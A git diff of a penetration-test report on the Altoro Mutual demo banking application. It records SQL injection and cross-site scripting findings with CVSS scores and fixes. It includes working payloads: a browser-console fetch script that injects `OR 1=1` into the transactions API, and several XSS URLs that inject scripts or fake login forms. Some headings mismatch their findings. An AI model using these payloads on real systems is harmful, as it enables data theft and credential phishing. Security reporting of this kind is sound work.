@@ -39,8 +39,6 @@ header-includes: |
 - **Impact:** severe impact; successful exploitation gives the attacker the ability to list all transactions on the system
 - **Recommendations:** use prepared statements instead of interpolating user inputs in the transactions listing SQL queries
 
-<!-- TODO: do finding scenario for this -->
-
 ## SQL injection in REST API (transactions)
 
 - **Test CVSS severity**: High
@@ -207,7 +205,17 @@ header-includes: |
 - **Test CVSS score:** 8.6
 - **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
 - **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/xss/>
-- **Description of the vulnerability:** an attacker can inject arbitrary HTML/CSS/JavaScript by putting them in the `content` parameter in `/altoromutual/bank/queryxpath.jsp?content=queryxpath.jsp&query=%22/%3E%3Cscript%3Ealert(%27xss%20injected%27)%3C/script%3E`
+- **Description of the vulnerability:** an attacker can inject arbitrary HTML/CSS/JavaScript by putting them in the `content` parameter in `/bank/queryxpath.jsp`
+- **Impact:** severe impact; an attacker can send such link to other users; the link appears as if it is genuine but it can contain an evil script or form that can cause the victim's data to be stolen
+- **Recommendations:** follow OWASP's recommendations in the link in the description of the type of the vulnerability
+
+## Cross site scripting in `/bank/queryxpath.jsp`
+
+- **Test CVSS severity**: High
+- **Test CVSS score:** 8.6
+- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
+- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/xss/>
+- **Description of the vulnerability:** an attacker can inject arbitrary HTML/CSS/JavaScript by putting them in the `startDate` or `endDate` parameter in `/bank/transaction.jsp`
 - **Impact:** severe impact; an attacker can send such link to other users; the link appears as if it is genuine but it can contain an evil script or form that can cause the victim's data to be stolen
 - **Recommendations:** follow OWASP's recommendations in the link in the description of the type of the vulnerability
 
@@ -309,12 +317,43 @@ SELECT COUNT(*) FROM PEOPLE WHERE USER_ID = 'asd' or 1=1 -- AND PASSWORD='anythi
 
 `DBUtil.getTransactions()` method interpolates the user input in the SQL query; hence making the attacker able to execute arbitrary queries. The resulting query becomes:
 
-```sql
-SELECT * FROM TRANSACTIONS
-WHERE (ACCOUNTID = 800004)
-AND (DATE BETWEEN '2018-06-11 00:00:00' AND '2018-06-11 23:59:59')
-OR 1=1 -- 23:59:59') ORDER BY DATE DESC
+## SQL injection in REST API (transactions)
+
+### Test steps
+
+Run the following script while on the website (F12 > console), and observe how all transactions on the system are listed:
+
+```javascript
+username = 'jdoe';
+password = 'demo1234';
+res = await (
+  await fetch('/altoromutual/api/login', {
+    headers: { 'Content-Type': 'application/json' },
+    method: 'POST',
+    body: JSON.stringify({
+      username,
+      password
+    })
+  })
+).json();
+
+auth = res.Authorization;
+
+res = await (
+  await fetch('/altoromutual/api/account/800004/transactions', {
+    headers: { 'Content-Type': 'application/json', Authorization: auth },
+    method: 'POST',
+    body: JSON.stringify({
+      startDate: '2018-06-11',
+      endDate: "2018-06-11 23:59:59') OR 1=1 --"
+    })
+  })
+).json();
 ```
+
+![Listing all of the transactions on the system through the REST API](image-38.png)
+
+### Cause
 
 ## Unauthorized file access (`Q3_earnings.rtf`)
 
@@ -662,7 +701,7 @@ The admin URL pattern in `AdminFilter` in `web.xml` is misspelled (`/adimn/*` in
 
 - Visit `/bank/customize.jsp?lang=%3Cbr%3E%3Cform%3E%3Clabel%3Eevil%20username%3C/label%3E%3Cinput%20type=%27text%27%3E%3Cbr%3E%3Clabel%3Eevil%20password%3C/label%3E%3Cinput%20type=%27password%27%3E%3Cinput%20type=%27submit%27%3E%3C/form%3E` and observe how an evil form was injected:
 
-![Evil form in customize.jsp](image-34.png)
+![XSS in customize.jsp](image-34.png)
 
 ### Cause
 
@@ -674,7 +713,7 @@ The admin URL pattern in `AdminFilter` in `web.xml` is misspelled (`/adimn/*` in
 
 - You are the victim, visit `/search.jsp?query=%3Cform%3E%3Clabel%3Eevil+username%3C%2Flabel%3E%3Cinput+type%3D%22text%22%3E%3Cbr%3E%3Clabel%3Eevil+password%3C%2Flabel%3E%3Cinput+type%3D%22password%22%3E%3C%2Fform%3E` and observe how an evil form was injected:
 
-![Evil form in search.jsp](image-35.png)
+![XSS in search.jsp](image-35.png)
 
 ### Cause
 
@@ -686,7 +725,7 @@ The admin URL pattern in `AdminFilter` in `web.xml` is misspelled (`/adimn/*` in
 
 - You are the victim, visit `/util/serverStatusCheckService.jsp?HostName=%3Cscript%3Ealert(%22XSS%20injected%22)%3C/script%3E` and observe how an arbitrary script is run
 
-![Evil script in serverStatusCheckService.jsp](image-36.png)
+![XSS in serverStatusCheckService.jsp](image-36.png)
 
 ### Cause
 
@@ -700,8 +739,22 @@ The admin URL pattern in `AdminFilter` in `web.xml` is misspelled (`/adimn/*` in
 
 - Visit `/bank/queryxpath.jsp?content=queryxpath.jsp&query=%22/%3E%3Cscript%3Ealert(%27xss%20injected%27)%3C/script%3E` and observe how an arbitrary script is run
 
-![Evil script in queryxpath.jsp](image-37.png)
+![XSS in queryxpath.jsp](image-37.png)
 
 ### Cause
 
 `queryxpath.jsp` does not sanitize the request parameter before placing it on the DOM
+
+## Cross site scripting in `/bank/queryxpath.jsp`
+
+### Test steps
+
+- Log in as any user (you will be the victim)
+
+- Visit `/bank/transaction.jsp?startDate=%22/%3E%3Cscript%3Ealert(%22XSS%20injected%22)%3C/script%3E` and observe how an arbitrary script is run
+
+![XSS in transaction.jsp](image-39.png)
+
+### Cause
+
+`transaction.jsp` does not sanitize the request parameters before placing it on the DOM
